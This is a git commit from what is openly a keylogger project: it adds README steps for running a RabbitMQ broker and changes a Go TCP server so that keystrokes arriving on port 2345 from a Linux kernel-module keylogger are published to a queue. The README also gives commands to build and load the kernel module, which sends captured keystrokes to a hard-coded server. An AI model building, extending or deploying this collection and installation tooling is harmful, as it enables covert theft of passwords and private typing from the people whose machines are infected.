4c4ed167c34f19d844225fa1d9933fbfcb73b936
shangsuru <helm.henry99@gmail.com>
2022-02-22 13:09:01 +0100

    forward keystrokes to RabbitMQ

--- README.md
+++ README.md
@@ -1,30 +1,48 @@
 # Keylogger
 
+## Server
+
+The server listens on port 2345 and forwards received keystrokes to RabbitMQ.
+
+Install RabbitMQ:
+
+```
+docker run -d --name rabbitmq -e RABBITMQ_DEFAULT_USER=user -e RABBITMQ_DEFAULT_PASS=password -p 8080:15672 -p 5672:5672 rabbitmq:3-management
+```
+
+Go to the management console exposed at port 8080 and create a queue `keystrokes`. Then start the server inside the `server/master` folder:
+
+```
+RABBITMQ_URI="amqp://user:password@localhost:5672/" RABBITMQ_QUEUE=keystrokes go run main.go
+```
+
 ## Kernel Module
 
 Follow these steps to install the kernel module onto the linux machine. It will capture keystrokes  
-and send them to a hard coded server address at port 2345.  
+and send them to a hard coded server address at port 2345.
 
 For testing, you can start a TCP listener at that server with `nc -l 2345`.
 
-
 1. Compile the kernel module
+
     ```
-	make
+    make
     ```
 
 2. Load the kernel module
+
     ```
-	sudo insmod keylogger.ko
-	sudo lsmod # show kernel modules
+    sudo insmod keylogger.ko
+    sudo lsmod # show kernel modules
     ```
 
 3. View kernel logs
+
     ```
-	sudo dmesg
+    sudo dmesg
     ```
 
 4. Unload the kernel module
     ```
-	sudo rmmod keylogger
+    sudo rmmod keylogger
     ```
--- server/master/main.go
+++ server/master/main.go
@@ -4,23 +4,53 @@ import (
 	"bufio"
 	"log"
 	"net"
+	"os"
+	"time"
+
+	"github.com/streadway/amqp"
 )
 
-func handleConnection(conn net.Conn) {
-	remoteAddr := conn.RemoteAddr().String()
+func handleConnection(tcpConn net.Conn, amqpConn *amqp.Connection) {
+	remoteAddr := tcpConn.RemoteAddr().String()
 	log.Printf("Serving %s\n", remoteAddr)
-	defer conn.Close()
+	defer tcpConn.Close()
+
+	channelAmqp, err := amqpConn.Channel()
+	if err != nil {
+		log.Printf("Could not connect to RabbitMQ: %v\n", err)
+		return
+	}
+
 	for {
-		data, err := bufio.NewReader(conn).ReadString('\n')
+		data, err := bufio.NewReader(tcpConn).ReadString('\n')
 		if err != nil {
 			log.Printf("%s disconnected\n", remoteAddr)
 			break
 		}
-		log.Println(string(data))
+
+		// Send data to RabbitMQ
+		log.Printf("%s: \"%s\"", remoteAddr, data)
+		err = channelAmqp.Publish(
+			"",
+			os.Getenv("RABBITMQ_QUEUE"),
+			false,
+			false,
+			amqp.Publishing{
+				DeliveryMode: amqp.Persistent,
+				Timestamp:    time.Now(),
+				ContentType:  "text/plain",
+				Body:         []byte(data),
+			},
+		)
+		if err != nil {
+			log.Printf("Could not publish keystrokes: %v\n", err)
+			continue
+		}
 	}
 }
 
 func main() {
+	// Receive keystrokes via TCP
 	ln, err := net.Listen("tcp", ":2345")
 	if err != nil {
 		log.Fatalf("Could not create TCP server: %v\n", err)
@@ -28,12 +58,19 @@ func main() {
 	defer ln.Close()
 	log.Println("Listening on port 2345")
 
+	// Keystrokes are published via RabbitMQ
+	amqpConn, err := amqp.Dial(os.Getenv("RABBITMQ_URI"))
+	if err != nil {
+		log.Fatal(err)
+	}
+	log.Println("Connected to RabbitMQ server")
+
 	for {
-		conn, err := ln.Accept()
+		tcpConn, err := ln.Accept()
 		if err != nil {
 			log.Printf("Error accepting connection: %v\n", err)
 			continue
 		}
-		go handleConnection(conn)
+		go handleConnection(tcpConn, amqpConn)
 	}
 }
